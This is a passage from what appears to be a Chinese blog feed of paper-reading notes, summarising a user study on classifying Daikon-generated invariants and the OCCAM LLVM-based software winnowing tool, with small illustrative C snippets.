start="2"><li>了解导致分类成功或失败的原因</li></ol></li><li>实验内容：<ul><li><ol><li>给参与者提供3个Java程序之一，用Daikon生成不变量，要求参与者判断不变量是否正确</li></ol></li><li><ol start="2"><li>分析评估有效性的因素</li></ol></li></ul></li><li>关键结果：<ul><li><ol><li>与先前研究结果相反，用户在正确分类不变量方面遇到了困难</li></ol><ul><li>因此，为了减少人工检测不正确不变量的需求，除改进不变量生成技术外，还可以通过开发帮助用户理解不变量为何是正确的工具来改进</li></ul></li><li><ol start="2"><li>导致不变量错误分类的因素很微妙</li></ol></li></ul></li></ul></li><li>本文贡献<ul><li><ol><li>两项用户调研，调查用户准确分类，动态不变量检测中不变量的能力</li></ol></li><li><ol start="2"><li>证据表明：用户很难对正确的和不正确的不变量进行分类，与先前工作矛盾</li></ol></li><li><ol start="3"><li>对影响用户有效性的几个因素进行了分析</li></ol></li><li><ol start="4"><li>对结果讨论，讨论影响有效性的因素，突出了改善动态不变量生成的可用性的潜在方法</li></ol></li></ul></li></ul><h3 id="2-%E7%9B%B8%E5%85%B3%E5%B7%A5%E4%BD%9C" tabindex="-1">2 相关工作</h3><ul><li>介绍了不变量生成技术</li><li>上一个不变量用户研究[23]，其使用静态分析工具，得出的结果是好的，不适用于本文</li></ul><h3 id="3-%E7%A0%94%E7%A9%B6%E8%AE%BE%E8%AE%A1" tabindex="-1">3 研究设计</h3><ul><li>3个问题<ul><li>RQ1 How effective are users at classifying correct and incorrect invariants?</li><li>RQ2 How is user classification effectiveness influenced by program complexity/size?</li><li>RQ3 How does the difficulty of classifying invariants vary?</li></ul></li></ul><h4 id="3.1-%E5%AE%9E%E9%AA%8C%E6%80%BB%E8%A7%88" tabindex="-1">3.1 实验总览</h4><ul><li>用户研究实验细则，过</li></ul><h4 id="3.2-java%E6%A0%B7%E4%BE%8B%E7%A8%8B%E5%BA%8F" tabindex="-1">3.2 Java样例程序</h4><h4 id="3.3-%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E4%B8%8D%E5%8F%98%E9%87%8F%E7%94%9F%E6%88%90" tabindex="-1">3.3 使用动态不变量生成</h4><ul><li>使用Daikon的原因<ul><li><ol><li>First, Daikon is the most mature and well documented freely available toolset, with a large body of related research [9, 10, 23, 26].</li></ol></li><li><ol start="2"><li>Second, Daikon supports Java, which is familiar to our study participants</li></ol></li><li><ol start="3"><li>Third, Daikon’s approach has been adopted by commercial tools, specifically Agitator [3], and thus represents a tool likely to be used in practice.</li></ol></li><li><ol><li>Daikon是最成熟且文档全面可用的工具，有很多相关研究</li></ol></li><li><ol start="2"><li>可以使用在Java，参与者熟悉</li></ol></li><li><ol start="3"><li>已应用在实际</li></ol></li></ul></li><li>使用Randoop test input generation tool [24]生成测试用例，因为其是Java生成测试用例的成熟工具。每个程序生成1000个测试用例。 为什么是1000，因为不变量正确性在 64.7% - 83.3%，需要足够多的测试用例来产生一些错误的不变量</li><li>Diakon可以产生3种类型的不变量：<ul><li>method precondition</li><li>method postcondition</li><li>class invariant</li><li>本实验中去除了method precondition，因为其不容易理解</li></ul></li><li>Diakon输出采用 Java Modeling Language（JML）<ul><li>因其容易理解，且可以使用 JML 扩展编译 Java 来在测试期间检测到不变量的违规</li></ul></li></ul><h4 id="3.4-determining-invariant-correctness" tabindex="-1">3.4 Determining Invariant Correctness</h4><h4 id="3.5-experiment-procedure" tabindex="-1">3.5 Experiment Procedure</h4><h4 id="3.6-threats-to-validity" tabindex="-1">3.6 Threats to Validity</h4><h3 id="4-results" tabindex="-1">4 Results</h3><h4 id="rq1" tabindex="-1">RQ1</h4><ul><li>假设和零假设 Hypothesis &amp; null Hypothesis<ul><li>Hypothesis: 用户在分类正确不变量时比分类错误不变量时有效</li><li>null Hypothesis: 用户对不正确和正确不变量的正确分类百分比分布相同。</li></ul></li><li>假设成立</li></ul><h4 id="rq2" tabindex="-1">RQ2</h4><ul><li>Hypothesis:小的简单的程序比大的复杂的程序更容易分类</li><li>null Hypothesis:程序大小和复杂度不同的程序不变量正确分类分布相同</li><li>现有结果二者均不能明显支持（TODO：我还没看程序大小到底多大）</li></ul><h4 id="rq3" tabindex="-1">RQ3</h4><ul><li>我们预期不变量往往要么显然正确或错误，因此非常容易分类，要么非常难分类，因此大多数用户都会错误分类。换句话说，我们预期每个子图都呈双峰分布，大多数不变量几乎被所有用户正确分类（接近100%，“容易”），或者几乎没有被任何用户正确分类（接近0%，“困难”），中间很少。</li><li>然而，图中显示，我们的预期在任何研究、案例示例或不变量正确性的组合中都没有得到满足。</li><li>因此，似乎没有一些特定的生成不变量类型X会导致所有用户都遇到困难的子集，需要确定与用户分类困难相关的因素</li></ul><h3 id="5-discussion" tabindex="-1">5 Discussion</h3><p>在本节中，我们将研究与用户效果和不变量难度相关的其他潜在因素。在接下来的部分，我们将讨论我们结果的含义。</p><h4 id="5.1-establishing-a-pattern-of-difficulty-%E5%BB%BA%E7%AB%8B%E9%9A%BE%E5%BA%A6%E6%A8%A1%E5%BC%8F" tabindex="-1">5.1 Establishing a Pattern of Difficulty 建立难度模式</h4><ul><li>本研究的主要目标之一是确定与用户效果相关的因素。<ul><li>然而，我们需要首先确定是否存在这样的因素<ul><li>为此我们首先确定用户现过与不变量分类之间的难度是否存在关系（以用户错误分类的百分比衡量），难得不变量不易分类，简单的不变量容易分类</li></ul></li><li>由于没有难易不变量得存在，因此，我们无法确定与用户效果相关的因素</li></ul></li><li>为此我们根据以下假设建立难度模式，并进行实验验证，结果不是很明显</li><li>Hypothesis: 不变量I的错误分类用户百分比与所有检查I的用户的平均总体效果正相关</li></ul><h4 id="5.2-statistical-analysis" tabindex="-1">5.2 Statistical Analysis</h4><ul><li>在单一因素和组合因素下，没有产生强有力的预测关系</li></ul><h4 id="5.3-manual-analysis" tabindex="-1">5.3 Manual Analysis</h4><ul><li>在我们的初步分析之后，我们对每个不变量进行了手动检查，试图找出用户误分类不变量的定性原因。特别是，我们对高比例的用户（&gt;80%）倾向于误分类的不正确生成的不变量感兴趣。每位作者都独立进行了这项任务，发现了几种在这种情况下出现的模式<ul><li>模式1：对于信号异常状态的特定返回值的非排他性使用。</li><li>模式2：直接、未经检查地操纵类变量值。</li><li>模式3：不变量实用函数的潜在意外行为。</li></ul></li><li>由此推断，当使用动态不变量生成时，应注意<ul><li><ol><li>用户理解不变量语义</li></ol></li><li><ol start="2"><li>了解在应用程序的角落，特殊情况下，不变量可能不成立</li></ol></li></ul></li></ul><h3 id="6-implications-%E5%AF%B9%E6%9C%AA%E6%9D%A5%E5%B7%A5%E4%BD%9C%E7%9A%84%E5%BD%B1%E5%93%8D" tabindex="-1">6 implications 对未来工作的影响</h3><ul><li>虽然我们的研究是从软件测试的角度进行的，但所研究的方面适用于任何用户必须理解动态不变量生成结果的情境</li></ul><h4 id="6.1-crack-the-code-%E7%A0%B4%E8%A7%A3%E4%BB%A3%E7%A0%81" tabindex="-1">6.1 Crack the Code 破解代码</h4><ul><li>我们以为不变量要么易于分类，要么难以分类，实际上大部分处于中间地带</li><li>从统计分析上无法看到不变量分类的难度模型，手动分析只表明了一些导致不变量被错误分类的情景。</li><li>我们的研究没有破解代码，说明仍需要改进，该技术仍具有挑战性</li><li>然而，在4.3节中我们注意到不变量通常可以按难度排序，而难度与用户有效性有关。未来的工作，可能需要更大的样本量，才能找出原因。</li></ul><h4 id="6.2-generation-with-explanation-and-better-invariant-filtering-%E7%94%9F%E6%88%90%E5%B8%A6%E6%9C%89%E8%A7%A3%E9%87%8A%E7%9A%84%E4%B8%8D%E5%8F%98%E9%87%8F%E5%92%8C%E6%9B%B4%E5%A5%BD%E7%9A%84%E4%B8%8D%E5%8F%98%E9%87%8F%E8%BF%87%E6%BB%A4" tabindex="-1">6.2 Generation with Explanation and Better Invariant Filtering 生成带有解释的不变量和更好的不变量过滤</h4><ul><li><p>本研究表明，用户很难对正确的和不正确的不变量进行分类，因此有必要改进以帮助他们理解正确的不变量</p></li><li><p>目前，动态不变量生成是一个黑匣子，以程序轨迹作为输入，产生的程序不变量作为输出。</p></li><li><p>然而，如果不变量生成能够提供更好地理解每个不变量为何生成，用户可能</p><ul><li><ol><li>更快地理解为什么一个不变量是正确的，减少证明时间</li></ol></li><li><ol start="2"><li>识别论证中的缺陷，从而改进识别不正确不变量的过程</li></ol></li></ul></li><li><p>目前在Daikon种使用的使不变量失效的方法可以扩展使用更强大的技术。</p><ul><li>因为动态不变量生成依赖于程序轨迹，因此许多潜在有用的信息来源和分析技术未被使用</li><li>包括：<ul><li>程序覆盖信息（覆盖的方法，探索的路径）</li><li>静态分析技术，特别是证伪程序断言的技术[13]</li><li>动态分析技术，符号/共模执行[27]</li></ul></li><li>通过以上技术，可以减少生成不正确不变量的数量</li></ul></li></ul><h4 id="6.3-quantify-the-impact-of-user-error" tabindex="-1">6.3 Quantify the Impact of User Error</h4><ul><li>不变量分类错误有两类<ul><li>将正确的不变量分类为不正确<ul><li>此情况用户会想办法进行反正，花费用户时间</li></ul></li><li>将不正确的不变量分类为正确<ul><li>此情况较为严重，导致测试出现问题，造成对不变量信任缺失</li></ul></li></ul></li><li>平均而言<ul><li>正确生成的不变量有9.1%至31.7%被错误分类</li><li>而不正确生成的不变量有26.1%-58.6%被错误分类。</li></ul></li><li>本研究对用户能否实际使用这些不变量提出了质疑，在未来的工作中，了解用户错误如何对测试过程产生负面影响（确定不变量是否正确所需的时间，纠正测试中的假阳性所需的时间）是必要的，以了解动态不变量生成是否是一种成本效益的Oracle生成方法</li></ul><h3 id="7-%E7%BB%93%E8%AE%BA" tabindex="-1">7 结论</h3><ul><li>进行亮相研究评估一个在动态不变量生成中关键的方面：用户理解并正确分类生成不变量的能力</li><li>我们结果展示用户经常出错，与先前工作相冲突。</li><li>进一步分析表明，尽管用户效率和分类不变量的困难度存在一些模式，但不变量困难度与其他因素之间的关系是微妙的。<ul><li>诸如程序复杂性、不变量大小、引用的类变量数量等因素并没有强相关性。</li><li>然而，手动分析确实表明，与异常处理不当相关的某些边界情况可能导致几乎所有用户都错误地对复杂的不变量进行分类。</li></ul></li><li>为此，我们提出一些建议，弥补动态不变量生成技术和用户能力之间的差距<ul><li>通过额外的研究，进一步完善我们对不变量复杂性的理解；</li><li>扩展现有技术，以支持用户理解为什么不变量是正确的，并减少生成的不正确不变量的数量；</li><li>量化用户错误对不变量生成实际效果的影响。</li><li>评估必须量化生成test oracle的潜在有效性，及用户应用它们的能力</li></ul></li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> user_study </tag>
            
            <tag> Invariant </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (10)</title>
      <link href="/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(10)/"/>
      <url>/2024/03/21/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(10)/</url>
      
        <content type="html"><![CDATA[<h2 id="(10)-occam%3Aautomated-software-winnowing%C2%B7" tabindex="-1">(10) OCCAM:Automated Software Winnowing·</h2><p>Malecha G, Gehani A, Shankar N. Automated software winnowing[C],Proceedings of the 30th Annual ACM Symposium on Applied Computing. 2015: 1504-1511.</p><p>SAC’15 April 13-17, 2015, Salamanca, Spain<br>Symposium on Applied Computing 2015</p><p><img src="https://github.com/SRI-CSL/OCCAM" alt="开源地址"></p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>为了解决代码膨胀问题,我们介绍一个OCCAM工具.<ul><li>OCCAM结合了部分求值和类型理论的技术，旨在减少部署应用中的代码。</li><li>OCCAM可以在不对程序源代码进行注释或以其他方式修改的情况下使用。</li><li>它利用配置时间信息生成一个根据将要部署的上下文进行专门定制的应用程序版本。</li></ul></li><li>我们介绍了我们的算法、实现和实验评估。</li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li>模块化软件库 通过为图形,文件操作和网络提供 可复用功能,使得编写复杂应用更加容易,然而,为了实现通用性,库往往比应用程序所需要的功能更多<ul><li>如 libpng[10]提供了复杂的接口进行图像转换,但许多都用不到</li></ul></li><li>这个问题也涉及了软件栈的多个层次,由跨层依赖引入的开销<ul><li>如 miniblog[13]运行在PHP上,而PHP历来与libc,libc中许多函数仅被miniblog不使用的PHP代码使用. 这些函数包含在静态链接的二进制文件中,存储在磁盘中,执行期间需要内存,多余的代码甚至会被反向导向编程利用</li></ul></li><li>尽管大多数系统不是资源限制的,但 目前普遍的实现中,即使是 二进制文件中 不用的功能 和共享库也会影响性能,可靠性和安全.<ul><li>为此,我们提出了一种将代码特化到实际使用中并简化掉未使用功能的方法</li></ul></li><li>我们提出了 winnnowing(筛选),一种使用部分求值的静态分析和代码特化工具<ul><li>该过程保留了原始程序的正常语义,即原始程序在指定输入上的行为与精简程序的行为相同</li><li>无效的执行,如缓冲区溢出,会以不同方式执行</li></ul></li><li>在基本层次上,程序的功能对应于潜在的执行的适量,如C标准库中的socket函数</li></ul><pre><code class="language-C">int socket(int domain, int type, int protocol);</code></pre><ul><li>该函数接收3个int值,有大量潜在行为,但大多数组合不会被特定程序使用.<ul><li>如Web 服务器通常打开AF_INET和AF_INET6套接字，但不需要AF_APPLETALK或AF_ATMPVC套接字。</li><li>Winnowing的目标是从软件堆栈中删除未使用的行为,减少需要分析的代码,同时保留需要的功能</li></ul></li></ul><h4 id="%E5%8A%A8%E6%9C%BA" tabindex="-1">动机</h4><ul><li><p>筛选部署二进制文件的4个原因</p></li><li><p><strong>专用服务器</strong>:虚拟机的出现使得 高度专业化的服务器称为常态</p><ul><li>如Web服务器通常仅托管单个站点,而虚拟机中过于通用的库只会引入代码膨胀,即虚拟机之间的隔离破坏了共享代码的好处</li></ul></li><li><p><strong>自定义库</strong></p><ul><li>在嵌入式平台上,能够简化库,意味着开发人员可以通过删除不用的功能以使用更大更成熟的库.</li><li>许多应用程序在提供 编译时配置 来移除大块代码. 然而这种方法又开发者定义而不是使用者,因此对开发人员来说增加了维护不同构建配置的负担</li><li>上述方法也无法提供对应用程序获取内容的精确控制<ul><li>如,即使是间接地使用大型组件中的单个函数,也需要整个组件的存在</li><li>此外,为管理员增加了工作量,因为他们必须及时更新系统,这会涉及与应用程序无关的补丁,因为很难确定应用程序是否使用了有缺陷的函数,尤其在使用动态语言时</li></ul></li></ul></li><li><p><strong>简化分析</strong></p><ul><li>在安全重要的系统中,含有大型库是一种负担</li><li>更小的应用程序,较少的配置选项,更少更通用功能的库,更容易进行静态分析.</li><li>此外,部分估值的代码通常更简单,使得静态分析对上下文感知更有效</li></ul></li><li><p><strong>二进制多样性</strong></p><ul><li>专用库使得缓冲区溢出更难以利用</li><li>PHP等平台在可预测的地方包含相同的功能集</li><li>特化每个应用的部署实例,不仅可以移除不需要的功能,还可以移动和改变遗留的功能. 这对剩余功能的攻击更加困难</li></ul></li></ul><h4 id="%E8%B4%A1%E7%8C%AE" tabindex="-1">贡献</h4><ul><li><p>我们讨论了简化单个应用程序的思想和方法,我们的方法对所有同质的应用程序是相同的,即所有代码都可以编译成LLVM[7]位码格式的应用程序.</p></li><li><p>我们选择LLVM框架,因为该框架包括几种流行语言的前端,包括C,C++,Java,其有着明确的中间表示,支持静态和动态编译</p></li><li><p>我们的工作提供了以下内容</p><ul><li>一种用于大幅减少代码功能(包括库和应用程序)的工具. 可以用于实际的大型,工业程序中</li><li>一种将外部信息纳入简化过程的模块化方法. 这可以来用执行策略,如&quot;不应调用邮件&quot;或&quot;系统只能用字符串 ls 调用&quot;,类似面向切面的编程</li><li>关于 简化 对 二进制大小 和 执行性能 影响的 实质分析. 结果标明,简化的二进制文件在性能上没有额外的开销,根据不同的应用程序可以显著减少二进制文件的大小</li><li>一种工具 透明地增强大型软件项目的比那一过程,如Php,SQLite,以生成LLVM为嘛和本机目标文件</li></ul></li></ul><h3 id="2-winnowing" tabindex="-1">2 winnowing</h3><p>本节介绍了我们的方法的一个实例<br>2.1 描述筛选一个单独的编译片段,用LLVM调用模块<br>2.2 描述多模块筛选,使之可在更大的库和动态加载中使用</p><h4 id="2.1-%E6%A8%A1%E5%9D%97%E5%86%85%E7%B2%BE%E7%AE%80" tabindex="-1">2.1 模块内精简</h4><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_1.png" alt></p><ul><li>LLVM的基本编译单元是模块,对于简单的程序,通常包含在一个单独的模块中,此时可以用上图的方法进行简化程序<ul><li>下面以简化C语言正则表达式库为例(仅使用C进行说明,所有的分析和转换都在LLVM位码上进行)</li></ul></li></ul><pre><code class="language-C">int regcomp ( regex_t ∗preg , const char ∗regex ,int cflags )&#123; /∗ . . . regcomp code . . . ∗/ &#125;void main ( int argc , char∗ argv[ ] ) &#123;  regex_t re;  regcomp (&amp;re,argv[1] , REG_EXTENDED|REG_ICASE ) ;  . . .&#125;</code></pre><ul><li><p>算法过程如下</p></li><li><p><strong>0. 编译</strong>:将源码编译为LLVM位码. 第三部分将讨论我们的工具,他能自动化的构建LLVM位码,通过指导构建Unix系统的脚本,如GNU的自动化工具</p></li><li><p><strong>1. 部分估值</strong>:winnower的核心是部分估值器,由两个阶段组成,winnower交错并迭代执行这两个阶段</p><ul><li><strong>1.1 优化</strong>:<ul><li>部分求值始于简化代码。其目标是暴露在编译时可确定的常量，消除死代码，并减少已知的控制流。将部分求值器应用于我们的代码片段将减少按位或运算，得到以下结果：<pre><code class="language-C">void main ( int argc , char∗ argv[ ] ) &#123;  regex_t re;  regcomp (&amp;re,argv[1] , REG_EXTENDED|REG_ICASE ) ;  . . .&#125;</code></pre></li><li>正如 Fujita [2] 和 Smowton [12] 所指出的那样，LLVM 优化器的激进性使其成为一个合理的程序内部部分求值器。</li><li>我们使用LLVM的 -O3 优化配置文件,包含了一些列简化,如 局数值编号、启发式循环展开、稀疏条件常数传播、常数折叠以及已知函数简化（简化对 libc 函数的调用，如 strlen 和 memcpy）。此优化传递还对局部函数执行一些保守的程序间优化，例如内联小函数和消除未使用的参数。</li></ul></li><li><strong>1.2 特化</strong><ul><li>优化阶段后,使用启发式方法 更 激进地在跨函数边界进行特化,在这个过程中寻找编译时已知参数的函数调用. 例如,regcomp的最后一个参数指定选项,如不区分大小写或是否支持扩展正则表达式. 该选项在编译时已知,因此可以进行特化,用已知的常量进行替代,删除不需要的参数<pre><code class="language-C">int regcomp ( regex_t ∗preg , const char ∗regex  )&#123; /∗ . . . regcomp with cflags=3 . . . ∗/ &#125;</code></pre></li><li>再将优化运用到这个特化后的函数上,可以通过简化对cflags的分支语句来删除四代码,还有可能将常量推送到其它参数的位置上,进行更进一步地特化</li><li>如果原始地使用,这两个阶段的迭代可能会增加代码的大小,但可以通过各种启发式方法来控制这一点.<ul><li>一种启发式方法是仅在未特化版本可以删除时特化函数,这个启发式方法完全对应减少功能的情况,是一种理想情况</li><li>实际上,我们发现 需要更激进地进行特化,以揭示有益的低级特化. 我们目前的启发式方法是贪婪的,只要看到一个支持的常量就进行特化,同时忽略可变参数函数.  除了整数之外，我们的专门化过程还支持浮点数、常量字符串、任何类型的空值以及全局变量和函数的地址。</li></ul></li><li><strong>递归</strong>:函数特化的主要困难是调用图中的循环,如果没有递归,我们可以限制特化的数量,因为我们指导LLVM优化器不会无限展开训话,然而,在有递归的情况下,我们必须检测特化何时会发散,考虑如下简单递归函数<pre><code class="language-C">int foo(int start,int end)&#123;  if(start&gt;end)&#123;return start-end;&#125;  return foo(start+1,end);&#125;int bar(ing x)&#123;  return foo(1,x);&#125;//特化后int foo_1(int end)&#123;  if(1&gt;end)&#123;return 1-end;&#125;  return foo_1(2,end);&#125;</code></pre><ul><li>此时foo_1(2,end)仍然可以特化,此时特化将无法停止,因为不知道end的值. 因此我们当前的实现选择不特化递归函数.</li><li>值得注意的是,部分评估器通过实践绑定分析[1,5]解决了这个问题,同时确实存在递归函数的部分评估技术[4]</li></ul></li></ul></li></ul></li><li><p><strong>2 消除</strong>:在部分评估稳定,或二进制文件变得过大而无法处理时,我们会删除不再需要的内部全局变量.</p><ul><li>在优化删除无法访问的代码时,全局变量可能变得没用.如果全局函数被特化,并且其所有被调用的位置都可以被特化的实例替代,则将删除这些全局函数.</li><li>我们使用LLVM的三个优化器实现了这个阶段: globaldce, globalopt, strip-dead-prototypes</li></ul></li><li><p><strong>3 链接</strong>:在迭代到固定点之后，我们使用 LLVM 工具将精简后的代码链接在一起构建二进制文件。这</p></li><li><p>模块内的简化算法构建了输入模块的语义等效版本，同时努力消除不必要的功能。</p></li><li><p>该算法可应用于任何单个编译单元，包括静态库和共享对象，因为它不通过删除导出的函数或更改其名称或类型来修改外部可见接口（在 LLVM 的抽象层面）。</p></li><li><p>然而，部分评估可能会极大地改变程序的内部结构，使得在代码中未表现的监控行为（如堆栈检查）失效。</p></li></ul><h4 id="2.2-%E6%A8%A1%E5%9D%97%E9%97%B4%E7%B2%BE%E7%AE%80" tabindex="-1">2.2 模块间精简</h4><ul><li>模块内精简效果好,因为大多数应用程序可以在精简之前通过静态链接库构建为单个模块。,但大型程序必须要与共享库进行交互,因此需要模块间精简</li><li>跨模块的精简的难点在于 代码的分离 和 维护兼容的二进制接口. 此外,我们希望特化是可重用的.<ul><li>如,我们会构建标准库的自定义版本,该版本通过仅包含这些应用程序所需的功能来支持多个应用程序。</li><li>然后，我们希望能够自动重写客户端应用程序以重用相同的精简库</li></ul></li><li>原理上,我们将模块间精简分为三个任务<ul><li>2.2.1 计算模块间依赖关系,使模块间的独立精简称为可能</li><li>2.2.2 对模块进行特化,</li><li>2.2.3 根据生成的规范进行重写</li><li>2.2.4 封存模块,隐藏其它模块未使用的符号,以便在链接时优化期间消除未使用的函数</li></ul></li><li>简化构成迭代 模块特化和封存 步骤,以产生完整的二进制文件</li><li>处于解释目的,我们考虑特化以下简单的代码片段，其中 bar 是在另一个模块中实现的。</li></ul><pre><code class="language-C">extern void bar(int,int);int main(int argc, char* argv[])&#123;  bar(argc,5);  bar(2,argc);  return 0;&#125;</code></pre><h5 id="2.2.1-%E4%BE%9D%E8%B5%96%E8%AE%A1%E7%AE%97" tabindex="-1">2.2.1 依赖计算</h5><ul><li>核心的组合机制是计算和使用模块的（函数和全局变量）依赖关系。<ul><li>在但模块内 简化时,有bar的代码可以立即特化</li><li>此时bar在另一个模块中定义,我们只能将foo记录未客户端模块的依赖</li></ul></li><li>为了对函数进行有意义的特化,我们需要知道关于参数值的信息。我们使用单例类型系统来表达这些信息 [8,16]。<ul><li>单例类型系统支持使用相等谓词对类型进行细化. 例如C 类型系统只能表达变量 x 是整数（int x）。使用单例类型，我们可以细化这个类型，不仅说明 x 是一个整数，而且其值为 5（int=5 x）。因此，我们简单程序的依赖关系如下：<pre><code class="language-C">bar(int=?, int=5)// 使用int=?表示未知的int值bar(int=2, int=?)</code></pre></li></ul></li><li>为了计算一个模块的依赖项,我们从模块的入口遍历调用图,并寻找外部符号引用.<ul><li>直接引用和调用点很简单；我们确定目标函数并记录信息</li><li>间接函数调用和函数指针则更为复杂。我们依赖于 LLVM 工具计算调用图，这些工具采用标准的程序分析技术，如别名分析和控制流和数据流分析。这些分析提高了 OCCAM 解析间接函数调用的能力。<ul><li>当我们无法静态确定调用的目标时，我们必须记录对每个可能的目标函数的最一般化（即未特化）调用。这是因为我们可能在不进行全局代码重写情况下,更改二进制接口。例如，如果代码将 bar 的地址存储在函数指针中，我们必须保守地记录最一般的依赖关系：</li></ul></li><li>在某些情况下，模块内部剔除期间进行的部分评估将简化这个结构，使我们能够静态解析函数。虽然这阻止了进一步的特化，但在一般情况下是不可避免的，例如，当被特化的程序在表中查找函数指针时。</li></ul></li><li>要计算整个应用程序的依赖项，我们从包含程序入口点的模块开始，并遍历代码链接的库，如下图所示。为了处理循环模块依赖的一般情况，我们迭代这个过程，直到后续的依赖计算不产生额外的依赖项<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_2.png" alt="image"></li></ul><h5 id="2.2.2-%E7%89%B9%E5%8C%96" tabindex="-1">2.2.2 特化</h5><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_3.png" alt="image"></p><ul><li>特化,使用每个客户模块的依赖性来决定要特化的函数</li><li>如上图示,遍历依赖文件中的调用列表，确定是否以及如何特化每个函数。函数特化的工作方式与模块内情况相同</li><li>即，复制函数体，删除常量参数，并将它们替换为函数体中。</li><li>区别在,与模块内简化不同,我们无法访问函数调用点以重写它们来调用专门的函数. 因此,我们生成了一份重写规范,详细说明客户端如何修改以使用更具体地接口.</li><li>以之前bar的特化举例,生成以下重写,此时只需调用一个参数</li></ul><pre><code class="language-C">&quot;bar&quot;(int=?1, int=5) -&gt; &quot;bar_x_5&quot;(int=?1)&quot;bar&quot;(int=2, int=?2) -&gt; &quot;bar_2_x&quot;(int=?2)</code></pre><h5 id="2.2.3-%E9%87%8D%E5%86%99" tabindex="-1">2.2.3 重写</h5><ul><li>特化后,使用重写规范更新客户端模块. 我们遍历所有外部定义函数的调用点,并查找与调用点匹配的最精确的重写,更新调用点以使用新的函数名和参数</li><li>例如之前的例子变为</li></ul><pre><code class="language-C">int main(int argc, char* argv[])&#123;  bar_x_5(argc);  bar_2_x(argc);  return 0;&#125;</code></pre><ul><li>特化步骤不会删除任何未特化的函数,因为不匹配任何规则的调用点将继续调用未专门化的函数</li><li>重写本质上与模块内特化修改调用者相同,但需要向模块内添加新的函数原型,并从重写规范中重新读取.</li><li>因为我们没有修改通用函数的数显,因此我们可以安全地忽略间接调用和将外部符号存储在变量中</li></ul><h5 id="2.2.4-%E5%B0%81%E5%AD%98" tabindex="-1">2.2.4 封存</h5><ul><li><p>重写完成后，模块内和跨模块的消除即可等效。在此步骤中，我们将对外部世界没有直接引用的符号变为内部，有效地覆盖了其他模块可以与我们的模块进行交互的漏洞。这允许模块内精简删除不可达代码并更激进地优化函数，因为它可以静态分析所有潜在的调用点。</p></li><li><p>使用我们的接口，封装模块非常简单，如下图所示。我们只需迭代所有外部符号，并将任何未在接口中引用的符号变为内部。值得注意的是，拥有准确的接口对于此步骤的正确性至关重要，因为如果我们尝试在另一个模块中引用内部符号，链接将失败。</p></li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_4.png" alt="image"></p><h4 id="2.3-%E5%8A%A8%E6%80%81%E6%A3%80%E6%9F%A5" tabindex="-1">2.3 动态检查</h4><ul><li>当我们能够在组件中静态确定接口的时候，简化效率最高。</li><li>然而在某些情况下，比如通过函数指针进行调用时，确定函数如何调用将会变得困难。例如，在面向对象语言中进行动态分派或在动态语言的解释器中查找函数表时，以下说明一个实例</li></ul><pre><code class="language-C">extern int (*foo)(int);extern int (*bar)(int);void go(bool foobar) &#123;    int (*f)(int) = foobar ? foo : bar;    f(2);     f(3);&#125;</code></pre><ul><li>此代码中，我们只知道 foo 和 bar 会以参数2，3调用，但重写代码并不简单，因为我们在对f的调用中要实用不同的函数。 在这里，我们必须要构建一个包装函数来检查参数并根据需要调度到特化版本，或者在违反接口时发出错误信号，以保持相同的二进制级别的接口。</li><li>这里有两个潜在位置执行动态检查，在调用点或者函数定义处，各有不同的好处</li></ul><h5 id="2.3.1-%E9%87%8D%E5%86%99%E5%AE%A2%E6%88%B7%E7%AB%AF" tabindex="-1">2.3.1 重写客户端</h5><p>第一种选择是重写客户端，即在调用点执行检查。<br>此时，库只导出特化函数（foo_2 和 foo_3 ），但客户端同时需要非特化的。为此，我们必须通过测试其参数并将其分配到合适的特化函数中来实现通用函数。如在客户端模块实现foo如下</p><pre><code class="language-C">extern int foo_2();extern int foo_3();inline int foo(int x) &#123;    if (x == 2) return foo_2(); // foo(2)    if (x == 3) return foo_3(); // foo(3)    exit(1);&#125;</code></pre><ul><li>对客户端进行部分估值将导致该调用被内联，并且在x是静态已知的情况下删除条件。对于调用不符合接口的代码，将执行fall-through并发出错误信号</li></ul><h5 id="2.3.2-%E9%87%8D%E5%86%99%E5%BA%93" tabindex="-1">2.3.2 重写库</h5><ul><li>另一种选择是重写库中的目标函数，这对于强制执行，无法静态验证的 库的接口很有用<br>。它还可以在单独模块中进行使用，以解决间接调用的困难那，为此，OCCAM复制了旧的foo实现并进行重写</li><li>我们将导出的函数foo替换为一个检查参数的函数（以强制执行foo只能用2，3调用），并相应的进行委托或终止客户端。 由于oldfoo在库中是内部的，有static修饰，模块内的简化将对其进行特化并最终从执行文件中删除通用版本</li></ul><pre><code class="language-C">int foo(int x) &#123;    if (x == 2) return oldfoo(2);    if (x == 3) return oldfoo(3);    exit(1);&#125;static int oldfoo(int x) &#123; /* foo code */ &#125;</code></pre><h3 id="3-%E5%AE%9E%E7%8E%B0" tabindex="-1">3 实现</h3><ul><li><p>我们实现了我们描述的所有技术，并应用于多个实例，以了解在实际应用中实用简化技术的实用性</p></li><li><p>我们的代码作为一组LLVM编译器传递实现的。我们通过一组Python包装器实用LLVM 